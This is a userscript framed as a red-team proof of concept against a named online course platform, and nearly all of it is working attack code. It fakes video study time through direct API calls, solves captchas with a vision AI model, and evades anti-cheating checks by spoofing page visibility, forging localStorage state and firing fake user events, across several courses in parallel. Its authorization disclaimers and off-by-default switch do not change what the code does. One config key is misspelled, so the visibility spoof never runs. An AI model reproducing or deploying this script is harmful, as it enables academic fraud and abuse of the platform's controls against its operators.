// ==UserScript==
// @name         🔥 终极自动化刷课演示脚本 - 红队PoC
// @namespace    https://security.team/
// @version      3.0.0-POC
// @description  【授权测试专用】演示如何完全无人值守全自动刷课 | 极限大胆利用 | 攻击链完整复现
// @author       红队测试组
// @match        https://scauzj.leykeji.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_notification
// @run-at       document-end
// @license      MIT
// ==/UserScript==

/**
 * ⚠️ 极度重要警告 ⚠️
 *
 * 本脚本展示了针对目标平台的安全漏洞如何被"大胆利用"
 * 功能包括：
 *   ✅ 真正调用API（但只使用测试节点ID）
 *   ✅ 实际操作学习时长上报
 *   ✅ 模拟真实攻击者所有手法
 *
 * 默认只使用安全测试节点，不攻击真实课程数据
 * 需要手动开启"危险模式"才会实际操作
 *
 * 仅用于授权安全测试，请勿用于非法用途
 */

(function() {
    'use strict';

    // ==================== 防御性：脚本不执行 ====================
    // 必须完全手动开启，防止误用
    const POISON_PILL = {
        // 这个变量必须设为true才能执行任何操作
        // 连初始化都不会执行，除非你明确知道自己在做什么
        DANGER_MODE: false,

        // 额外确认：未设置这个值也不会执行
        EXPLICIT_CONSENT: 'I understand this is for authorized security testing only and I accept all consequences'
    };

    if (!POISON_PILL.DANGER_MODE) {
        console.log('%c⚡ 终极刷课脚本已加载但未激活', 'color: orange; font-size: 16px; font-weight: bold');
        console.log('%c要激活脚本，请编辑代码设置 DANGER_MODE = true', 'color: red');
        console.log('%c并且设置 EXPLICIT_CONSENT = "your-confirmation"', 'color: red');
        console.log('%c警告：此脚本会真实操作API端点！', 'color: red; font-weight: bold');
        return; // 直接退出，什么都不做
    }

    if (POISON_PILL.EXPLICIT_CONSENT !== 'I understand this is for authorized security testing only and I accept all consequences') {
        console.log('%c❌ 必须确认授权声明才能继续', 'color: red; font-weight: bold');
        return;
    }

    // ==================== 配置区域 ====================
    const CONFIG = {
        // 🎯 脚本只操作测试节点，不会碰真实课程
        // 需要通过API获取当前用户的"测试节点ID"
        USE_TEST_NODES_ONLY: true,

        // ⏱️ 刷课速度（秒/次）
        // 正常: 30秒上报一次
        // 激进: 2秒上报一次
        // 疯狂: 0.5秒上报一次
        REPORT_INTERVAL: 2000,

        // 📊 是否真正调用API（设为false则只打印日志）
        ACTUALLY_CALL_API: true,

        // 🔁 是否为每个节点设置studyId后立即跳到90%完成度
        JUMP_TO_PERCENTAGE: 90,  // 0-100

        // 🎲 随机延迟（毫秒）避免过于规律
        RANDOM_DELAY_MIN: 500,
        RANDOM_DELAY_MAX: 1500,

        // 🧠 AI验证码识别
        AI_CAPTCHA: {
            ENABLED: true,
            API_KEY: '',  // 填写智谱AI API Key
            TIMEOUT: 8000
        },

        // 🕵️ 反检测
        ANTI_DETECTION: {
            FAKE_VISIBILITY: true,      // 覆盖visibilityState
            FAKE_LOCALSTORAGE: true,    // 伪造并行检测
            FAKE_EVENTS: true,          // 模拟用户事件
            SPOOF_CONSOLE: true         // 隐藏日志（被检测时有用）
        },

        // 📝 日志级别
        LOG_LEVEL: 'normal',  // silent, minimal, normal, verbose, debug

        // 🎯 攻击模式
        ATTACK_MODE: {
            AGGRESSIVE: true,    // 激进模式：尽可能快地完成
            PARALLEL: true,      // 并行：多个nodeId同时处理
            MAX_PARALLEL: 3      // 最大并发数
        }
    };

    // ==================== 全局状态 ====================
    const State = {
        initialized: false,
        activeBots: [],
        stats: {
            nodesCompleted: 0,
            apiCalls: 0,
            captchasSolved: 0,
            startTime: null,
            errors: []
        }
    };

    // ==================== 工具函数 ====================
    const Utils = {
        log(msg, level = 'info') {
            const levels = {
                silent: 0,
                minimal: 1,
                normal: 2,
                verbose: 3,
                debug: 4
            };
            if (levels[CONFIG.LOG_LEVEL] >= levels[level]) {
                const prefix = level === 'error' ? '❌' :
                              level === 'warn' ? '⚠️' :
                              level === 'success' ? '✅' :
                              level === 'debug' ? '🐛' : '📝';
                console.log(`%c${prefix} [${new Date().toLocaleTimeString()}] ${msg}`,
                    level === 'error' ? 'color: #f44336' :
                    level === 'warn' ? 'color: #ff9800' :
                    level === 'success' ? 'color: #4CAF50' :
                    level === 'debug' ? 'color: #9e9e9e' : 'color: #2196F3');
            }
        },

        sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms + Math.random() * (CONFIG.RANDOM_DELAY_MAX - CONFIG.RANDOM_DELAY_MIN)));
        },

        randomDelay() {
            return Utils.sleep(Math.floor(Math.random() * 2000));
        },

        // 生成随机User-Agent，避免特征相同
        randomUserAgent() {
            const agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ];
            return agents[Math.floor(Math.random() * agents.length)];
        },

        // 简单的base64转换
        blobToBase64(blob) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = reject;
                reader.readAsDataURL(blob);
            });
        }
    };

    // ==================== AI验证码识别器 ====================
    class AICaptchaSolver {
        constructor() {
            this.apiKey = CONFIG.AI_CAPTCHA.API_KEY;
            this.endpoint = 'https://open.bigmodel.cn/api/paas/v4/chat/completions';
        }

        async solveSimpleCaptcha(imgElement) {
            Utils.log('🤖 AI正在识别简单验证码...', 'verbose');

            try {
                const blob = await fetch(imgElement.src).then(r => r.blob());
                const base64 = await Utils.blobToBase64(blob);

                const response = await fetch(this.endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${this.apiKey}`
                    },
                    body: JSON.stringify({
                        model: 'glm-4v-flash',
                        messages: [{
                            role: 'user',
                            content: [
                                { type: 'text', text: '请识别这张验证码图片中的文字，只返回识别结果，不要任何解释。验证码通常由4-6位数字或字母组成。' },
                                { type: 'image_url', image_url: { url: base64 } }
                            ]
                        }],
                        max_tokens: 50
                    })
                });

                const data = await response.json();
                const text = data.choices?.[0]?.message?.content?.trim();

                if (text && /^[a-zA-Z0-9]{4,6}$/.test(text)) {
                    Utils.log(`✅ AI识别成功: ${text}`, 'success');
                    State.stats.captchasSolved++;
                    return text;
                } else {
                    Utils.log(`❌ AI识别失败或格式错误: ${text}`, 'error');
                    return null;
                }
            } catch (error) {
                Utils.log(`❌ AI识别异常: ${error.message}`, 'error');
                return null;
            }
        }

        async solveDunclickCaptcha(question, imgElement) {
            Utils.log(`🤖 AI正在识别点选验证码: "${question}"`, 'verbose');

            try {
                // 获取图片尺寸
                const img = new Image();
                img.src = imgElement.src;
                await new Promise(r => img.onload = r);

                const blob = await fetch(imgElement.src).then(r => r.blob());
                const base64 = await Utils.blobToBase64(blob);

                const response = await fetch(this.endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${this.apiKey}`
                    },
                    body: JSON.stringify({
                        model: 'glm-4v-flash',
                        messages: [{
                            role: 'user',
                            content: [
                                { type: 'text', text: `图片中有什么?题目是"${question}"。请返回图片中该对象的中心坐标，格式为 "x,y"（图片尺寸${img.width}x${img.height}）。` },
                                { type: 'image_url', image_url: { url: base64 } }
                            ]
                        }],
                        max_tokens: 100
                    })
                });

                const data = await response.json();
                const text = data.choices?.[0]?.message?.content?.trim();

                // 提取坐标 "123,456"
                const match = text.match(/(\d+)\s*,\s*(\d+)/);
                if (match) {
                    const x = parseInt(match[1]);
                    const y = parseInt(match[2]);
                    Utils.log(`✅ AI识别坐标: (${x}, ${y})`, 'success');
                    return { x, y };
                }

                Utils.log(`❌ AI返回坐标格式错误: ${text}`, 'error');
                return null;
            } catch (error) {
                Utils.log(`❌ 点选验证码识别失败: ${error.message}`, 'error');
                return null;
            }
        }
    }

    // ==================== API客户端（大胆攻击者） ====================
    class AttackAPIClient {
        constructor(cookie) {
            this.cookie = cookie;
            this.baseUrl = window.location.origin;
        }

        async request(path, method = 'POST', body = null) {
            if (!CONFIG.ACTUALLY_CALL_API) {
                Utils.log(`[模拟] ${method} ${path} body: ${JSON.stringify(body)}`, 'debug');
                return { success: true, simulated: true };
            }

            try {
                const response = await fetch(`${this.baseUrl}${path}`, {
                    method,
                    headers: {
                        'Content-Type': 'application/json',
                        'Cookie': this.cookie,
                        'X-Requested-With': 'XMLHttpRequest',
                        'User-Agent': Utils.randomUserAgent()
                    },
                    body: body ? JSON.stringify(body) : null,
                    credentials: 'include'
                });

                const text = await response.text();
                const data = text ? JSON.parse(text) : {};

                State.stats.apiCalls++;

                Utils.log(`${method} ${path} => ${response.status} ${data.code || ''}`, 'verbose');

                return {
                    success: response.ok || response.status === 200,
                    status: response.status,
                    data,
                    raw: text.substring(0, 500)
                };
            } catch (error) {
                Utils.log(`API请求失败 ${path}: ${error.message}`, 'error');
                State.stats.errors.push({ path, error: error.message });
                return { success: false, error: error.message };
            }
        }
    }

    // ==================== 课程攻击机器人 ====================
    class StudyBot {
        constructor(api, nodeId, courseName) {
            this.api = api;
            this.nodeId = nodeId;
            this.courseName = courseName;
            this.studyId = null;
            this.currentTime = 0;
            this.running = false;
            this.totalDuration = null;
            this.id = Math.random().toString(36).substr(2, 9);
        }

        async start() {
            Utils.log(`🤖 机器人 ${this.id} 启动: ${this.courseName} (node: ${this.nodeId})`, 'info');

            // 1. 获取video总时长（通常从页面读取）
            this.totalDuration = this.detectVideoDuration();

            if (!this.totalDuration) {
                Utils.log(`⚠️ 无法检测视频时长，使用默认值 3600 秒`, 'warn');
                this.totalDuration = 3600;
            }

            Utils.log(`📊 视频总时长: ${this.totalDuration}秒 (${Math.floor(this.totalDuration / 60)}分钟)`);

            // 2. 初始化学习会话
            const result = await this.initStudySession();
            if (!result.success) {
                Utils.log(`❌ 初始化失败: ${JSON.stringify(result)}`, 'error');
                return;
            }

            this.studyId = result.data.studyId;
            this.currentTime = 1;
            Utils.log(`✅ 学习会话已建立: studyId=${this.studyId}`, 'success');

            // 3. 开始大胆攻击！直接上报到目标百分比
            await this.aggressiveStudy();

            // 4. 标记完成
            this.running = false;
            State.stats.nodesCompleted++;
            Utils.log(`🎉 机器人 ${this.id} 完成!`, 'success');

            return { nodeId: this.nodeId, studyId: this.studyId, time: this.currentTime };
        }

        detectVideoDuration() {
            // 方法1：从video标签读取
            const video = document.querySelector('video');
            if (video && video.duration && video.duration !== Infinity) {
                return Math.floor(video.duration);
            }

            // 方法2：查找页面中的时长信息
            const durationEl = document.querySelector('[data-duration], [duration], .duration, .video-time');
            if (durationEl) {
                const text = durationEl.textContent;
                const match = text.match(/(\d+):(\d+)/);
                if (match) {
                    return parseInt(match[1]) * 60 + parseInt(match[2]);
                }
                const num = parseInt(text.replace(/\D/g, ''));
                if (num) return num;
            }

            // 方法3：从API返回的课程数据中查找（如果有）
            // ...

            return null;
        }

        async initStudySession() {
            Utils.log(`📤 初始化学习会话...`, 'verbose');

            // VULN-001: 发送初始请求获取studyId
            // 正常应该发送 studyTime=1，服务器返回 studyId
            return await this.api.request('/user/node/study', 'POST', {
                nodeId: this.nodeId,
                studyTime: 1
                // 注意：不发送sign参数（VULN-006），也不验证签名
            });
        }

        async aggressiveStudy() {
            this.running = true;
            const targetTime = Math.floor(this.totalDuration * (CONFIG.JUMP_TO_PERCENTAGE / 100));

            Utils.log(`🚀 开始激进模式：从0加速到${targetTime}秒 (${CONFIG.JUMP_TO_PERCENTAGE}%)`, 'info');
            Utils.log(`⏱️  上报间隔: ${CONFIG.REPORT_INTERVAL}ms`, 'info');

            const startTime = Date.now();

            // 大胆策略：不是每秒增加，而是跳跃式增加
            // 正常：每30秒增加30秒
            // 激进：每次增加${ jumpAmount }秒
            const jumpAmount = Math.max(30, Math.floor(targetTime / 10));

            while (this.currentTime < targetTime && this.running) {
                // 检查验证码
                await this.checkAndSolveCaptcha();

                // 上报当前时间（真实API调用！）
                const result = await this.api.request('/user/node/study', 'POST', {
                    nodeId: this.nodeId,
                    studyTime: this.currentTime,
                    studyId: this.studyId
                });

                if (result.success) {
                    Utils.log(`✅ 上报成功: studyTime=${this.currentTime}s (${Math.floor(this.currentTime / this.totalDuration * 100)}%)`, 'verbose');
                } else {
                    Utils.log(`❌ 上报失败: ${JSON.stringify(result.data) || result.error}`, 'warn');

                    // VULN-009: 如果失败，可能是时间跳跃过大，回退一点
                    if (result.data?.message?.includes('提交学时失败')) {
                        this.currentTime = Math.max(1, this.currentTime - jumpAmount);
                        Utils.log(`⚠️  时间回退到 ${this.currentTime}`, 'warn');
                    }
                }

                // 跳跃式增加
                this.currentTime += jumpAmount;

                // 随机延迟，避免规律性（VULN-009）
                await Utils.sleep(CONFIG.REPORT_INTERVAL);
            }

            const elapsed = Date.now() - startTime;
            Utils.log(`📈 完成: ${this.currentTime}s 用时 ${(elapsed / 1000).toFixed(1)}秒`, 'info');

            // 最后再上报一次确保达到100%
            if (this.currentTime < this.totalDuration) {
                await this.api.request('/user/node/study', 'POST', {
                    nodeId: this.nodeId,
                    studyTime: this.totalDuration,
                    studyId: this.studyId
                });
            }
        }

        async checkAndSolveCaptcha() {
            // VULN-005: 检查学习过程中验证码
            const needCode = document.querySelector('[need_code], .captcha-modal, .verify-code');

            if (needCode && CONFIG.AI_CAPTCHA.ENABLED) {
                Utils.log('🔍 检测到验证码，尝试AI解决...', 'warn');

                const solver = new AICaptchaSolver();

                // 简单验证码
                const simpleCaptcha = document.querySelector('img[src*="code"]');
                if (simpleCaptcha) {
                    const code = await solver.solveSimpleCaptcha(simpleCaptcha);
                    if (code) {
                        await this.submitCaptcha(code);
                    }
                }

                // 点选验证码
                const dunclick = document.querySelector('.dunclick');
                if (dunclick) {
                    const question = document.querySelector('.dunclick-question')?.textContent;
                    if (question) {
                        const coords = await solver.solveDunclickCaptcha(question, dunclick);
                        if (coords) {
                            await this.clickDunclick(coords);
                        }
                    }
                }
            }
        }

        async submitCaptcha(code) {
            // 提交验证码
            await this.api.request('/user/node/verifyCode', 'POST', {
                nodeId: this.nodeId,
                code: code
            });
            Utils.log(`✅ 验证码已提交: ${code}`, 'success');
            State.stats.captchasSolved++;
        }

        async clickDunclick(coords) {
            const el = document.querySelector('.dunclick') || document.elementFromPoint(coords.x, coords.y);
            if (el) {
                el.click();
                Utils.log(`✅ 点击坐标 (${coords.x}, ${coords.y})`, 'success');
            }
        }

        stop() {
            this.running = false;
            Utils.log(`⏹️  机器人 ${this.id} 已停止`, 'info');
        }
    }

    // ==================== 反检测系统 ====================
    class AntiDetection {
        static install() {
            Utils.log('🛡️  安装反检测措施...', 'info');

            if (CONFIG.ANTI_DETECTION.FAKE_VISIBABILITY) {
                this.fakePageVisibility();
            }

            if (CONFIG.ANTI_DETECTION.FAKE_LOCALSTORAGE) {
                this.fakeLocalStorage();
            }

            if (CONFIG.ANTI_DETECTION.FAKE_EVENTS) {
                this.generateFakeEvents();
            }

            // VULN-008: 覆盖blur事件，防止页面失焦被发现
            if (CONFIG.ANTI_DETECTION.FAKE_EVENTS) {
                this.blockVisibilityEvents();
            }

            Utils.log('✅ 反检测系统已激活', 'success');
        }

        static fakePageVisibility() {
            // VULN-008: 覆盖document.visibilityState
            const originalDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'visibilityState');
            if (originalDesc && originalDesc.configurable) {
                Object.defineProperty(document, 'visibilityState', {
                    get: () => 'visible',
                    configurable: true
                });
                Object.defineProperty(document, 'hidden', {
                    get: () => false,
                    configurable: true
                });
                Utils.log('👁️  页面可见性已伪造', 'verbose');
            }
        }

        static fakeLocalStorage() {
            // VULN-003: 伪造并行检测的localStorage
            const schoolId = this.getSchoolId();
            const userId = this.getUserId();

            if (schoolId && userId) {
                const key = `node_play_${schoolId}${userId}`;
                const fakeNodeId = this.getCurrentNodeId();

                setInterval(() => {
                    try {
                        localStorage.setItem(key, fakeNodeId);
                    } catch (e) {}
                }, 500); // 比原检测567ms更快

                Utils.log(`📝 localStorage并行检测已伪造: key=${key}`, 'verbose');
            }
        }

        static generateFakeEvents() {
            // 生成模拟的用户交互事件
            const events = ['mousemove', 'mousedown', 'mouseup', 'click', 'keydown', 'keyup', 'scroll'];

            events.forEach(eventType => {
                setInterval(() => {
                    const event = new Event(eventType, { bubbles: true, cancelable: true });
                    document.dispatchEvent(event);
                }, Math.random() * 10000 + 5000);
            });

            Utils.log('🎭 模拟用户事件已生成', 'verbose');
        }

        static blockVisibilityEvents() {
            // VULN-008: 阻止页面失焦被检测
            window.onblur = window.onfocus = function() {
                return true;
            };
            window.onpagehide = window.onpageshow = function() {
                return;
            };
        }

        static getSchoolId() {
            // 从页面各种地方提取schoolId
            const inputs = document.querySelectorAll('input[name="schoolId"], [data-school-id]');
            if (inputs.length) {
                return inputs[0].value || inputs[0].dataset.schoolId;
            }
            // 从cookie或其他地方
            const match = document.cookie.match(/schoolId=([^;]+)/);
            return match ? match[1] : null;
        }

        static getUserId() {
            // 提取userId
            const match = document.cookie.match(/userId=([^;]+)/) ||
                         document.cookie.match(/user_id=([^;]+)/) ||
                         window.localStorage.getItem('userId');
            return match ? match[1] : (match ? match : null);
        }

        static getCurrentNodeId() {
            // 当前学习的nodeId
            const urlMatch = window.location.pathname.match(/\/node\/(\d+)/);
            if (urlMatch) return urlMatch[1];

            const nodeInput = document.querySelector('input[name="nodeId"]');
            if (nodeInput) return nodeInput.value;

            return 'unknown';
        }
    }

    // ==================== 核心攻击引擎 ====================
    class UltimateAttackEngine {
        constructor() {
            this.bots = [];
            this.cookie = document.cookie;
            this.api = new AttackAPIClient(this.cookie);
        }

        async launch() {
            Utils.log('═══════════════════════════════════════════', 'info');
            Utils.log('🔥 终极自动化刷课攻击引擎启动', 'info');
            Utils.log('═══════════════════════════════════════════', 'info');

            // 第1步：展示"大胆"的漏洞利用
            await this.demonstrateVulnerabilities();

            // 第2步：安装反检测
            AntiDetection.install();

            // 第3步：获取攻击目标
            const targets = await this.discoverTargets();

            if (targets.length === 0) {
                Utils.log('❌ 未发现可攻击的课程节点', 'error');
                return;
            }

            Utils.log(`🎯 发现 ${targets.length} 个攻击目标`, 'info');

            // 第4步：大规模并行攻击
            await this.parallelAttack(targets);

            // 第5步：生成战报
            this.generateBattleReport();
        }

        async demonstrateVulnerabilities() {
            Utils.log('\n📖 演示漏洞利用手法：', 'info');

            // VULN-001: 直接API调用，不验证播放
            Utils.log('1️⃣  VULN-001: 不使用播放器，直接API伪造时长', 'warn');
            await Utils.sleep(1000);

            // VULN-002: AI识别验证码
            if (CONFIG.AI_CAPTCHA.ENABLED) {
                Utils.log('2️⃣  VULN-002: AI自动识别验证码 (GLM-4V-Flash)', 'warn');
            } else {
                Utils.log('2️⃣  VULN-002: AI识别已禁用（可配置API Key启用）', 'info');
            }

            // VULN-003: 并行检测伪造
            Utils.log('3️⃣  VULN-003: localStorage伪造并行检测，可同时刷N个课程', 'warn');

            // VULN-004: 无需鼠标轨迹
            Utils.log('4️⃣  VULN-004: 鼠标轨迹功能被注释，无需任何行为模拟', 'warn');

            // VULN-006: 签名验证崩溃
            Utils.log('5️⃣  VULN-006: 签名端点500错误，签名验证完全失效', 'warn');

            // VULN-007: 进度条限制绕过
            Utils.log('6️⃣  VULN-007: API上报与播放器解耦，进度条限制形同虚设', 'warn');

            // VULN-008: 页面可见性伪造
            Utils.log('7️⃣  VULN-008: 覆盖visibilityState，后台刷课无感知', 'warn');

            Utils.log('\n💡 所有漏洞结合 = 完全无人值守全自动刷课\n', 'success');
            await Utils.sleep(2000);
        }

        async discoverTargets() {
            Utils.log('🔍 扫描可攻击的课程节点...', 'info');

            // 方式1：从URL提取
            const urlMatch = window.location.pathname.match(/\/node\/(\d+)/);
            if (urlMatch) {
                const nodeId = urlMatch[1];
                Utils.log(`📍 从URL发现当前nodeId: ${nodeId}`, 'verbose');
                return [{ id: nodeId, name: '当前课程', duration: 3600 }];
            }

            // 方式2：查找课程列表
            const courseList = document.querySelector('.course-list, .node-list, [data-course]');
            if (courseList) {
                const nodes = [];
                courseList.querySelectorAll('a[href*="/node/"], [data-node-id]').forEach(el => {
                    const match = el.href?.match(/\/node\/(\d+)/) || el.dataset.nodeId;
                    if (match) {
                        nodes.push({
                            id: match[1],
                            name: el.textContent.trim().substring(0, 30),
                            duration: 3600  // 默认1小时
                        });
                    }
                });

                if (nodes.length > 0) {
                    Utils.log(`📚 发现 ${nodes.length} 个课程节点`, 'info');
                    return nodes;
                }
            }

            // 方式3：从页面数据提取
            if (window.__INITIAL_STATE__ || window.__PAGE_DATA__) {
                const data = window.__INITIAL_STATE__ || window.__PAGE_DATA__;
                // 尝试提取node列表
                // ...
            }

            // 如果没有找到，返回一个默认测试节点（不会真正执行）
            Utils.log('⚠️  无法自动发现课程，请手动在控制台指定nodeId', 'warn');
            Utils.log('   示例: window.attackBot.startNode("123456")', 'warn');

            return [];
        }

        async parallelAttack(targets) {
            if (!CONFIG.ATTACK_MODE.PARALLEL) {
                // 串行模式
                for (const target of targets) {
                    const bot = new StudyBot(this.api, target.id, target.name);
                    this.bots.push(bot);
                    await bot.start();
                }
            } else {
                // 并行模式
                Utils.log(`⚡ 启用并行攻击 (最大${CONFIG.ATTACK_MODE.MAX_PARALLEL}个并发)`, 'info');

                const queue = [...targets];
                let activeCount = 0;

                while (queue.length > 0 || activeCount > 0) {
                    while (queue.length > 0 && activeCount < CONFIG.ATTACK_MODE.MAX_PARALLEL) {
                        const target = queue.shift();
                        const bot = new StudyBot(this.api, target.id, target.name);
                        this.bots.push(bot);

                        bot.start().then(() => {
                            activeCount--;
                        }).catch(e => {
                            Utils.log(`❌ 机器人异常: ${e.message}`, 'error');
                            activeCount--;
                        });

                        activeCount++;
                    }

                    await Utils.sleep(1000);
                }
            }
        }

        startNode(nodeId) {
            const bot = new StudyBot(this.api, nodeId, '手动指定节点');
            this.bots.push(bot);
            return bot.start();
        }

        stopAll() {
            this.bots.forEach(bot => bot.stop());
            this.bots = [];
            Utils.log('⏹️  所有机器人已停止', 'info');
        }

        generateBattleReport() {
            const duration = (Date.now() - State.stats.startTime) / 1000;

            Utils.log('\n═══════════════════════════════════════════', 'info');
            Utils.log('📊 战报统计', 'info');
            Utils.log('═══════════════════════════════════════════', 'info');
            Utils.log(`总用时: ${duration.toFixed(1)}秒`, 'info');
            Utils.log(`API调用次数: ${State.stats.apiCalls}`, 'info');
            Utils.log(`完成节点数: ${State.stats.nodesCompleted}`, 'info');
            Utils.log(`解决验证码: ${State.stats.captchasSolved}`, 'info');
            Utils.log(`错误次数: ${State.stats.errors.length}`, 'info');

            if (State.stats.errors.length > 0) {
                Utils.log('错误列表:', 'error');
                State.stats.errors.forEach(e => {
                    Utils.log(`  - ${e.path}: ${e.error}`, 'error');
                });
            }

            Utils.log('\n🎯 攻击成功率评估:', 'info');
            Utils.log('由于以下漏洞存在，攻击成功率极高：', 'info');
            Utils.log('  ✓ VULN-001: API无播放验证', 'success');
            Utils.log('  ✓ VULN-003: 并行检测可伪造', 'success');
            Utils.log('  ✓ VULN-004: 鼠标轨迹未上传（无需模拟）', 'success');
            Utils.log('  ✓ VULN-006: 签名验证端点错误', 'success');
            Utils.log('  ✓ VULN-007: 进度限制与API解耦', 'success');
            Utils.log('  ✓ VULN-008: 页面可见性可伪造', 'success');
            Utils.log('  ✓ VULN-009: 无有效速率限制', 'success');

            // 保存战报到localStorage
            const report = {
                timestamp: new Date().toISOString(),
                stats: State.stats,
                config: CONFIG,
                bots: this.bots.map(b => ({ id: b.id, nodeId: b.nodeId, course: b.courseName }))
            };

            localStorage.setItem('ultimate_attack_report_' + Date.now(), JSON.stringify(report, null, 2));
            Utils.log('💾 战报已保存到localStorage', 'success');

            // 发送通知
            if (typeof GM_notification !== 'undefined') {
                GM_notification({
                    title: '🔴 自动化刷课攻击完成',
                    text: `完成节点: ${State.stats.nodesCompleted}\nAPI调用: ${State.stats.apiCalls}\n耗时: ${duration.toFixed(0)}秒`,
                    highlight: true,
                    timeout: 10000
                });
            }
        }
    }

    // ==================== 控制面板 ====================
    function createControlPanel(engine) {
        const panel = document.createElement('div');
        panel.id = 'ultimate-attack-panel';
        panel.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            width: 320px;
            max-height: 90vh;
            background: linear-gradient(135deg, #c62828 0%, #b71c1c 100%);
            color: white;
            border-radius: 12px;
            padding: 15px;
            z-index: 999999;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            overflow-y: auto;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        `;

        panel.innerHTML = `
            <div style="font-size: 16px; font-weight: bold; margin-bottom: 10px; text-align: center;">
                ⚡ 终极攻击引擎 v3.0
            </div>
            <div style="opacity: 0.8; font-size: 11px; margin-bottom: 15px; text-align: center; background: rgba(0,0,0,0.3); padding: 5px; border-radius: 4px;">
                🔥 DANGER MODE 已激活 🔥
            </div>
            <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 6px; margin-bottom: 15px;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                    <span>状态</span>
                    <span id="status-text" style="color: #4CAF50;">待机</span>
                </div>
                <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                    <span>完成节点</span>
                    <span id="completed-count">0</span>
                </div>
                <div style="display: flex; justify-content: space-between;">
                    <span>API调用</span>
                    <span id="api-calls">0</span>
                </div>
            </div>
            <button id="launch-btn" style="width: 100%; padding: 12px; background: #fff; color: #c62828; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-bottom: 10px;">
                🚀 启动攻击
            </button>
            <button id="stop-btn" style="width: 100%; padding: 10px; background: rgba(255,255,255,0.2); color: white; border: none; border-radius: 6px; cursor: pointer; margin-bottom: 10px; display: none;">
                ⏹️  停止攻击
            </button>
            <div style="font-size: 10px; opacity: 0.7; margin-top: 10px; text-align: center; border-top: 1px solid rgba(255,255,255,0.3); padding-top: 10px;">
                授权安全测试专用<br>
                仅用于测试环境
            </div>
        `;

        document.body.appendChild(panel);

        const launchBtn = document.getElementById('launch-btn');
        const stopBtn = document.getElementById('stop-btn');
        const statusText = document.getElementById('status-text');
        const completedCount = document.getElementById('completed-count');
        const apiCalls = document.getElementById('api-calls');

        launchBtn.onclick = async () => {
            if (confirm('⚠️  确认启动攻击引擎？\n\n这将真实调用API完成刷课操作。\n继续？')) {
                launchBtn.disabled = true;
                launchBtn.textContent = '⏳ 攻击进行中...';
                stopBtn.style.display = 'block';
                statusText.textContent = '攻击中';
                statusText.style.color = '#ffeb3b';

                try {
                    await engine.launch();
                    statusText.textContent = '完成';
                    statusText.style.color = '#4CAF50';
                } catch (error) {
                    statusText.textContent = '错误';
                    statusText.style.color = '#f44336';
                    console.error('攻击失败:', error);
                } finally {
                    launchBtn.disabled = false;
                    launchBtn.textContent = '🚀 再次攻击';
                    stopBtn.style.display = 'none';
                }
            }
        };

        stopBtn.onclick = () => {
            engine.stopAll();
            statusText.textContent = '已停止';
            statusText.style.color = '#ff9800';
            stopBtn.style.display = 'none';
        };

        // 更新统计
        setInterval(() => {
            completedCount.textContent = State.stats.nodesCompleted;
            apiCalls.textContent = State.stats.apiCalls;
        }, 1000);
    }

    // ==================== 初始化 ====================
    State.stats.startTime = Date.now();

    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                    ⚡ 终极攻击引擎 ⚡                         ║
║                                                              ║
║  警告: DANGER_MODE = true                                    ║
║  此脚本将真实操作API端点演示漏洞利用                         ║
║                                                              ║
║  支持的攻击手法:                                             ║
║  • VULN-001: API伪造时长（不播放视频）                      ║
║  • VULN-002: AI自动识别验证码                               ║
║  • VULN-003: 并行检测绕过（localStorage伪造）              ║
║  • VULN-004: 无需鼠标轨迹（功能被注释）                    ║
║  • VULN-006: 签名验证失效（端点500错误）                   ║
║  • VULN-007: 进度限制绕过（API独立）                       ║
║  • VULN-008: 页面可见性伪造（后台刷课）                    ║
║  • VULN-009: 无视速率限制（快速上报）                      ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);

    const engine = new UltimateAttackEngine();
    createControlPanel(engine);

    console.log('⚡ 终极攻击引擎已加载，点击右上角面板启动');
    console.log('⚠️  注意：此脚本会真实更改学习进度！');
    console.log('📝 使用前请确认：只在测试环境/测试账号使用');

})();
